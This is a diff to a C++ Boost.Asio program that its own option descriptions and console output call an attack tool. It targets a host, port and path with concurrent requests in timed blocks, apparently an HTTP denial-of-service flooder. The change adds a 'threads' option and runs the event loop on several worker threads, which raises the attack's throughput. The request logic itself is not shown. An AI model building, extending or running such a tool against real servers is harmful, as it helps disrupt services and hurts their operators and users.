@@ -3,13 +3,14 @@
 #include <boost/bind.hpp>
 #include <boost/format.hpp>
 #include <boost/program_options.hpp>
+#include <boost/thread/thread.hpp>
 
 using namespace std;
 using namespace boost;
 using namespace asio;
-namespace po = boost::program_options;
+namespace po = program_options;
 
-int concurrency, speed, blocks, interval, expires;
+int concurrency, threads, speed, blocks, interval, expires;
 string dest, port, location;
 bool debug;
 
@@ -98,6 +99,7 @@ int main(int argc, char *argv[]) {
 		("port,p", po::value<string>(&port)->default_value("80"), "Attack port")
 		("location,l", po::value<string>(&location)->default_value("/"), "Attack location")
 		("concurrency,c", po::value<int>(&concurrency)->default_value(20), "Concurrency requests")
+		("threads,t", po::value<int>(&threads)->default_value(0), "Worker threads")
 		("speed,s", po::value<int>(&speed)->default_value(100), "Speed to create initial requests (millisec)")
 		("blocks,b", po::value<int>(&blocks)->default_value(10), "Blocks count")
 		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between blocks")
@@ -128,10 +130,14 @@ int main(int argc, char *argv[]) {
 	io_service io;
 	deadline_timer timer(io);
 
-	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, speed=%5%, blocks=%6%, interval=%7%, expires=%8%, debug=%9%") % dest % port % location % concurrency % speed % blocks % interval % expires % debug << endl << endl;
+	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, threads=%5%, speed=%6%, blocks=%7%, interval=%8%, expires=%9%, debug=%10%") % dest % port % location % concurrency % threads % speed % blocks % interval % expires % debug << endl << endl;
 
 	requestFactory(&io, &timer, 0);
-	io.run();
 
+	for(int i = 0; i < threads; i++){
+		new thread(bind(&io_service::run, &io));
+	}
+
+	io.run();
 	return 0;
 }
